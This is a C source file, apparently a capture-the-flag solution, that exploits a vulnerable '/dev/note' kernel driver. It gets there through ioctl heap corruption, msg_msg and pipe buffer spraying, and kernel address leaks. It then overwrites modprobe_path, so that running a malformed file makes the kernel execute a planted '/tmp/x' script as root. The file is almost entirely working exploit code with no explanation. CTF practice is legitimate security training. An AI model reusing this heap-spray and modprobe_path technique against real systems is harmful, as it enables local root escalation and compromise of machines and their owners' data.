#include <stdio.h>

#include "msg_msg.h"
#include "pipe.h"
#include "helper.h"

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /dev/sda /flag\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /flag");

    exit(0);
}

int main(){

	int fd = open("/dev/note", 0);
	struct pipeio *pipe;

	printf("fd : %d\n",fd);	
	void * payload[100] = {0,};
	
	payload[0] = 0;	
	ioctl(fd, 0x1001,payload);

	payload[0] = 0;
	for(int i=0;i<6;i++){
		payload[1] = 6+i;
		ioctl(fd, 0x1002,payload);
	}
	payload[0] = 0;
	ioctl(fd, 0x1005,payload);

	cpu_affinity(0);
	int msqid;
	
	for(int i=0;i<1;i++){
		msqid = alloc_msg_queue();
		insert_msg_msg(msqid, 1, MSG_MSG_KMALLOC_CG_128, 0x10, "aaaabbbbaaaabbbb");
	}

	for(int i=0;i<6;i++){
                payload[1] = 6+i;
		ioctl(fd, 0x1002,payload);
		
		pipe = create_pipeio();
		resize_pipe(pipe, MSG_MSG_KMALLOC_CG_128);
                write_pipe(pipe, "AAAAAAAA", 8);
        }
	uint64_t *buf = read_msg_msg(msqid, 1, MSG_MSG_KMALLOC_CG_128);
	
	print_hex_8bytes(buf, 0, 2);
	uint64_t * leak = buf[0];
	printf("Kernel Heap Leak : %p\n",leak);
	uint64_t * kernel_base_terget = leak + 10;
	printf("kernel_base_terget : %p\n",kernel_base_terget);
	payload[0] = kernel_base_terget;
	insert_msg_msg(msqid, 1, MSG_MSG_KMALLOC_CG_128, 0x8, (char*)payload);
	read_msg_msg(msqid, 1, MSG_MSG_KMALLOC_CG_128);

	payload[0] = 0;
	payload[1] = 6;
	ioctl(fd, 0x1004, payload);
	uint64_t * kernel_leak = payload[2];
	uint64_t * modprobe_path = kernel_leak + 1195936; 
	printf("kernel leak : %p\n",kernel_leak);
	printf("modprobe_path : %p\n",modprobe_path);

	getchar();
	payload[0] = modprobe_path;
	insert_msg_msg(msqid, 1, MSG_MSG_KMALLOC_CG_128, 0x8, (char*)payload);

	payload[0] = 0;
	payload[1] = 6;
	payload[2] = 0x782f706d742f;
	payload[3] = 0;
	ioctl(fd, 0x1003, payload);
	
	sleep(3);
	get_flag();

	close(fd);
}
